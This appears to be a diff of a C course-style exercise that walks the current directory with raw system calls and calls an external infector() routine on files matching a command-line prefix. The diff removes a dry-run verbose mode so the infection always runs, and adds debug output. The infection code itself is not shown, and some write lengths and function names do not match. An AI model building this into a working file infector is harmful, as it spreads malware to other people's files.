@@ -10,6 +10,8 @@
 #define SYS_EXIT 1
 
 #define BUF_SIZE 8192
+#define suffix_c ".c"
+#define suffix_h ".h"
 
 extern int system_call();
 extern void infection();
@@ -25,6 +27,11 @@ struct linux_dirent
 
 int ends_with(const char *str, const char *suffix)
 {
+    // Debugging information
+    system_call(SYS_WRITE, STDOUT, "Checking suffix: ", 17);
+    system_call(SYS_WRITE, STDOUT, suffix, strlen(suffix));
+    system_call(SYS_WRITE, STDOUT, "\n", 1);
+
     int str_len = strlen(str);
     int suffix_len = strlen(suffix);
     if (suffix_len > str_len)
@@ -42,19 +49,12 @@ int main(int argc, char *argv[], char *envp[])
     int bpos;
     char *prefix = 0;
     int attach_virus = 0;
-    int verbose = 0;
 
     /* Check for -a{prefix} argument*/
     if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'a')
     {
         prefix = argv[1] + 2;
         attach_virus = 1;
-    }
-
-    /* Check for -v argument (verbose mode)*/
-    if (argc > 1 && argv[2][0] == '-' && argv[2][1] == 'v')
-    {
-        verbose = 1;
     }
 
     fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
@@ -74,24 +74,21 @@ int main(int argc, char *argv[], char *envp[])
     for (bpos = 0; bpos < nread;)
     {
         d = (struct linux_dirent *)(buf + bpos);
-        system_call(SYS_WRITE, STDOUT, d->name, strlen(d->name));
 
-        if (ends_with(d->name, ".c") || ends_with(d->name, ".h"))
+        // Debugging information
+        system_call(SYS_WRITE, STDOUT, "Processing file: ", 17);
+        system_call(SYS_WRITE, STDOUT, d->name, strlen(d->name));
+        system_call(SYS_WRITE, STDOUT, "\n", 1);
+
+        if (ends_with(d->name, suffix_c) || ends_with(d->name, suffix_h))
         {
-            system_call(SYS_WRITE, STDOUT, "\n", 1);
+            system_call(SYS_WRITE, STDOUT, " [SKIPPED]\n", 10);
             system_call(SYS_WRITE, STDOUT, "\n", 1);
         }
         else if (attach_virus && strncmp(d->name, prefix, strlen(prefix)) == 0)
         {
-            if (verbose)
-            {
-                system_call(SYS_WRITE, STDOUT, " [VIRUS WOULD BE ATTACHED]\n", 26);
-            }
-            else
-            {
-                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
-                infector(d->name);
-            }
+            system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
+            infector(d->name);
         }
         else
         {
@@ -99,6 +96,7 @@ int main(int argc, char *argv[], char *envp[])
         }
         bpos += d->len;
     }
+    system_call(SYS_WRITE, STDOUT, "\n", 1);
     system_call(SYS_EXIT, 0);
     return 0; /* This line will never be reached*/
 }
